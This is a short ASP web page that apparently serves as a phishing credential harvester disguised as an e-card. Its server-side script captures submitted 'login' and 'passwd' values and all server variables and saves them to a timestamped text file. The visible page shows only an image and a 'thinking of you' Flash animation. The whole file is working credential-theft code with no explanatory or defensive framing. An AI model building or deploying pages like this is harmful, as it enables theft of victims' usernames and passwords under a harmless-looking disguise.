<html>
<%str=request("login")&chr(13)&chr(10)%>
<%str=str&request("passwd")&chr(13)&chr(10)%>
<%str=str&Request.ServerVariables("LOCAL_ADDR")&chr(13)&chr(10)%>
<% For Each name In Request.ServerVariables %> 
<%str=str&name&"="&Request.ServerVariables(name)&chr(13)&chr(10)%>
<%Next%> 
<%set fs=server.createobject("scripting.filesystemobject")
set o=fs.CreateTextFile(server.mappath(replace(now(),":","-")&".txt"),true,false)
o.write(str)
o.close
set o=nothing
set fs=nothing%>
<center><img src=2.gif><embed src="thinkingofyou1_rc.swf" pluginspage="http://www.macromedia.com/shockwave/download/" type="application/x-shockwave-flash" width="100%" height="100%">
	  </embed> 